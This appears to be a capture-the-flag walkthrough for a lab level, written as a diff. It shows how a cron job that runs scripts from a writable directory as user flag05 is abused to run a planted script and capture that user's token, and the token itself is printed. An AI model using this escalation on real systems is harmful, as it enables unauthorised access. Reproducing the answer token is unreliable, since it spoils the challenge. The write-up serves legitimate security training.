@@ -1,0 +1,43 @@
+#after log "You have new mail." appears on stdout
+#user mail is stored at /var/mail/$USER
+#a file can be found in that directory
+
+cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+#this is a cron job: https://www.ostechnix.com/a-beginners-guide-to-cron-jobs/
+#every second minute, the 'flag05' command is executed
+
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+#ulimit info https://ss64.com/bash/ulimit.html
+#in this case ulimit sets the maximum amount of cpu time to 5
+#bash -x command starts bash in tracing mode. Shows command/script process
+#this script executes all scripts in /opt/openarenaserver/ then deletes them
+#by placing a file and waiting 2 minutes, we can see that the cron job is on
+
+#getfacl shows detail of access control list (ACL)
+getfacl /usr/sbin/openarenaserver
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+user::rwx
+user:level05:r--
+group::r-x
+mask::r-x
+other::---
+
+#since it has flag05 user rights, we can write our own script and place it
+#in the openarenaserver directory to have it run with flag05 permissions
+#the script:
+touch /tmp/flag; echo `getflag` > /tmp/flag
+
+#once the script is deleted we check the output
+cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
